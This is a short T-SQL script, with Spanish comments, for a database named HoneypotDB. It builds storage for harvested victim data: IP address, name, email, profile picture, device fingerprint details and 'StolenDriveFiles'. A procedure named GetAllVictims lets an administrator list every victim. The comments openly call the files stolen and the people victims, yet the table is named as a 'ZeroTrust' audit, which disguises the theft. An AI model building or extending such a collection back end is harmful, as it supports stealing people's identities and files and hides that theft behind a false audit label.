USE [HoneypotDB];
GO

-- Agregamos la columna para los archivos robados (si no existe)
IF NOT EXISTS (
  SELECT * FROM sys.columns 
  WHERE object_id = OBJECT_ID(N'[dbo].[ZeroTrustAudits]') AND name = 'StolenDriveFiles'
)
BEGIN
    ALTER TABLE [dbo].[ZeroTrustAudits] ADD [StolenDriveFiles] NVARCHAR(MAX) NULL;
END
GO

CREATE OR ALTER PROCEDURE [dbo].[InsertZeroTrustAudit]
    @IpAddress NVARCHAR(MAX),
    @IdentityName NVARCHAR(MAX),
    @IdentityEmail NVARCHAR(MAX),
    @IdentityPictureUrl NVARCHAR(MAX),
    @ScreenWidth INT,
    @ScreenHeight INT,
    @CpuCores INT,
    @RamGb DECIMAL(18,2),
    @BatteryLevelPct DECIMAL(18,2),
    @LanguageInfo NVARCHAR(MAX),
    @TimeZoneInfo NVARCHAR(MAX),
    @UserAgentData NVARCHAR(MAX),
    @StolenDriveFiles NVARCHAR(MAX) = NULL
AS
BEGIN
    SET NOCOUNT ON;

    -- Siempre insertaremos un nuevo registro para no perder los documentos extraídos
    INSERT INTO [dbo].[ZeroTrustAudits] (
        [TimestampUtc],
        [IpAddress],
        [IdentityName],
        [IdentityEmail],
        [IdentityPictureUrl],
        [ScreenWidth],
        [ScreenHeight],
        [CpuCores],
        [RamGb],
        [BatteryLevelPct],
        [LanguageInfo],
        [TimeZoneInfo],
        [UserAgentData],
        [StolenDriveFiles]
    )
    VALUES (
        GETUTCDATE(),
        @IpAddress,
        @IdentityName,
        @IdentityEmail,
        @IdentityPictureUrl,
        @ScreenWidth,
        @ScreenHeight,
        @CpuCores,
        @RamGb,
        @BatteryLevelPct,
        @LanguageInfo,
        @TimeZoneInfo,
        @UserAgentData,
        @StolenDriveFiles
    );
END
GO
-- Creamos el procedimiento para que el admin pueda ver todas las victimas
CREATE OR ALTER PROCEDURE [dbo].[GetAllVictims]
AS
BEGIN
    SET NOCOUNT ON;
    SELECT * FROM [dbo].[ZeroTrustAudits] ORDER BY [TimestampUtc] DESC;
END
GO
